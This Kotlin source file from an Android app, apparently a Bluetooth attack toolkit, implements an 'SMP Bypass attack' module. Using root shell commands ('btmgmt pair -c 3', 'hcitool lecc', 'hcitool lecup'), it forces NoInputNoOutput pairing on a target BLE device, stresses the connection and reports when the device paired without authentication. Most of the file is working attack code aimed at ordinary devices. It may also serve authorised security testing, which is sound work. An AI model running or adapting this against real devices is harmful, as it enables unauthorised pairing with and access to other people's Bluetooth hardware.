package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Module responsible for executing SMP (Security Manager Protocol) Bypass attacks.
 *
 * This module targets vulnerabilities in the BLE pairing and authentication phases.
 * It uses btmgmt to attempt raw SMP operations (pairing with NoInputNoOutput capability)
 * and hcitool for LE connections. A successful attack means the target accepted
 * pairing without proper authentication, bypassing the Security Manager.
 *
 * Root is required because btmgmt and raw LE HCI operations are privileged.
 * All privileged operations are executed through [RootExecutor].
 */
class SmpBypassModule {

    companion object {
        private const val TAG = "SmpBypassModule"
    }

    /**
     * Checks if root access is available via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Starts the SMP Bypass attack against a target device.
     *
     * The flow:
     * 1. Verify root access (required, no simulation fallback)
     * 2. Use btmgmt to attempt pairing with NoInputNoOutput capability
     * 3. Alternatively, use hcitool for LE connection establishment
     * 4. Report actual results from command output
     *
     * @param targetDevice The device to attack.
     * @return A Flow emitting progress logs.
     */
    fun startAttack(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = targetDevice.macAddress
        emit("Initializing SMP Bypass attack...")
        emit("Target: ${targetDevice.name ?: mac}")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("SMP packet manipulation requires root for btmgmt/hcitool access. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check available tools
        val btmgmtAvailable = checkBinary("btmgmt")
        val hcitoolAvailable = checkBinary("hcitool")

        if (btmgmtAvailable) {
            emit("btmgmt binary found. Using btmgmt approach.")
            executeBtmgmtApproach(mac)
        } else if (hcitoolAvailable) {
            emit("btmgmt not found. Falling back to hcitool LE approach.")
            executeHcitoolApproach(mac)
        } else {
            emit("ERROR: Neither btmgmt nor hcitool found.")
            emit("Install BlueZ management utilities to use SMP Bypass.")
            return@flow
        }
    }

    /**
     * Uses btmgmt to attempt LE pairing with NoInputNoOutput capability (bypass mode).
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeBtmgmtApproach(
        mac: String
    ) {
        // Step 1: Start LE discovery to confirm the target is visible
        emit("Starting LE discovery via btmgmt...")
        val findResult = RootExecutor.execute("btmgmt find -l")
        if (findResult.startsWith("Error")) {
            emit("LE discovery failed: $findResult")
            emit("Continuing with direct pairing attempt anyway...")
        } else {
            // Check if our target appeared in discovery results
            val targetFound = findResult.contains(mac, ignoreCase = true)
            if (targetFound) {
                emit("Target $mac found in LE discovery results.")
            } else {
                emit("Target $mac not seen in LE discovery. Attempting pairing anyway...")
            }
            // Emit relevant lines from discovery
            for (line in findResult.lines()) {
                if (line.isNotBlank()) {
                    emit("  discovery: $line")
                }
            }
        }

        // Step 2: Attempt pairing with NoInputNoOutput capability
        // -c 3 = NoInputNoOutput (bypasses user confirmation)
        // -t 1 = LE address type
        emit("Attempting SMP pairing with NoInputNoOutput capability...")
        emit("Executing: btmgmt pair -c 3 -t 1 $mac")
        val pairResult = RootExecutor.execute("btmgmt pair -c 3 -t 1 $mac")

        // Emit the full pairing output
        for (line in pairResult.lines()) {
            if (line.isNotBlank()) {
                emit("  pair: $line")
            }
        }

        // Analyze the result
        analyzePairingResult(pairResult, mac)
    }

    /**
     * Uses hcitool for LE connection establishment as a fallback approach.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeHcitoolApproach(
        mac: String
    ) {
        // Step 1: Establish LE connection
        emit("Creating LE connection to $mac...")
        emit("Executing: hcitool lecc $mac")
        val leccResult = RootExecutor.execute("hcitool lecc $mac")

        if (leccResult.startsWith("Error")) {
            emit("LE connection failed: $leccResult")
            emit("The target may not support BLE, be out of range, or not advertising.")
            return
        }

        emit("LE connection result: $leccResult")

        // Extract the connection handle from the output
        // hcitool lecc typically outputs: "Connection handle XXXX"
        val handleMatch = Regex("handle\\s+(\\d+|0x[0-9a-fA-F]+)", RegexOption.IGNORE_CASE)
            .find(leccResult)
        val handle = handleMatch?.groupValues?.get(1)

        if (handle != null) {
            emit("Connection handle: $handle")

            // Step 2: Update connection parameters to stress the link
            emit("Updating LE connection parameters...")
            val lecupResult = RootExecutor.execute(
                "hcitool lecup --handle $handle --min 6 --max 6 --latency 0 --timeout 200"
            )
            if (lecupResult.startsWith("Error")) {
                emit("Connection parameter update failed: $lecupResult")
            } else {
                emit("Connection parameter update: ${lecupResult.ifBlank { "OK" }}")
            }

            // Step 3: Attempt pairing via btmgmt if available, or report connection success
            val btmgmtCheck = checkBinary("btmgmt")
            if (btmgmtCheck) {
                emit("Attempting SMP pairing over established LE link...")
                val pairResult = RootExecutor.execute("btmgmt pair -c 3 -t 1 $mac")
                for (line in pairResult.lines()) {
                    if (line.isNotBlank()) {
                        emit("  pair: $line")
                    }
                }
                analyzePairingResult(pairResult, mac)
            } else {
                emit("LE connection established but btmgmt not available for SMP pairing.")
                emit("Connection handle $handle is active. Manual SMP analysis required.")
            }
        } else {
            emit("Could not extract connection handle from output.")
            emit("Raw output: $leccResult")
        }
    }

    /**
     * Analyzes btmgmt pairing output to determine if the SMP bypass succeeded.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.analyzePairingResult(
        result: String,
        mac: String
    ) {
        val upperResult = result.uppercase()
        when {
            upperResult.contains("PAIRED") && !upperResult.contains("NOT PAIRED") -> {
                emit("VULNERABILITY CONFIRMED: Target $mac accepted NoInputNoOutput pairing.")
                emit("SMP authentication was bypassed. The device paired without proper verification.")
                Log.w(TAG, "SMP Bypass confirmed on $mac")
            }
            upperResult.contains("REJECTED") || upperResult.contains("DENIED") -> {
                emit("Target rejected NoInputNoOutput pairing. SMP bypass failed.")
                emit("The target enforces proper pairing requirements.")
            }
            upperResult.contains("TIMEOUT") || upperResult.contains("TIMED OUT") -> {
                emit("Pairing attempt timed out. Target may be out of range or ignoring requests.")
            }
            upperResult.contains("ALREADY PAIRED") -> {
                emit("Target is already paired with this adapter.")
                emit("Unpair first (btmgmt unpair $mac) and retry to test the SMP state machine.")
            }
            result.startsWith("Error") -> {
                emit("Pairing command failed: $result")
            }
            else -> {
                emit("Pairing result inconclusive. Manual analysis of the output is recommended.")
            }
        }
    }

    /**
     * Checks if a binary is available in PATH via root shell.
     */
    private suspend fun checkBinary(name: String): Boolean {
        val result = RootExecutor.execute("which $name")
        return !result.startsWith("Error") && result.isNotBlank()
    }
}
